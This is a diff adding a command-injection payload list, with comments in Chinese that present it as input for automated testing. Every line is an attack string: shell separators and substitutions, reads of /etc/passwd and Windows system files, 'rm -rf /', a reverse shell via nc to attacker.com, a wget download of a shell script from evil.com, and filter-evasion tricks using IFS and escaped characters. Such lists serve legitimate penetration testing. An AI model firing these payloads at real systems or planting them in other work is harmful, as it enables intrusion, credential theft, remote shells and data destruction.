@@ -1,0 +1,67 @@
+# 命令注入测试Payload
+# 每行一个payload，用于自动化测试
+
+# ==== 基础命令注入 ====
+; ls
+| ls
+& ls
+&& ls
+|| ls
+` ls `
+$(ls)
+
+# ==== 管道符 ====
+| cat /etc/passwd
+| whoami
+| id
+| uname -a
+| pwd
+
+# ==== 命令替换 ====
+`cat /etc/passwd`
+$(cat /etc/passwd)
+`whoami`
+$(id)
+
+# ==== 分号注入 ====
+; cat /etc/passwd
+; rm -rf /
+; nc -e /bin/sh attacker.com 4444
+
+# ==== 逻辑运算 ====
+&& cat /etc/passwd
+|| cat /etc/passwd
+&& ls /
+|| whoami
+
+# ==== 换行注入 ====
+%0Als
+%0Acat /etc/passwd
+%0D%0Awhoami
+
+# ==== 重定向 ====
+> /tmp/test.txt
+>> /tmp/test.txt
+< /etc/passwd
+2>&1
+
+# ==== 后台执行 ====
+& sleep 10 &
+& wget http://evil.com/shell.sh &
+
+# ==== Windows命令 ====
+& dir
+| dir
+& type C:\Windows\win.ini
+& net user
+& ipconfig
+
+# ==== 编码绕过 ====
+;c\at /etc/passwd
+;ca\t /etc/passwd
+`c'a't /etc/passwd`
+
+# ==== Bash特殊变量 ====
+${IFS}cat${IFS}/etc/passwd
+$IFS$()cat$IFS$()
+
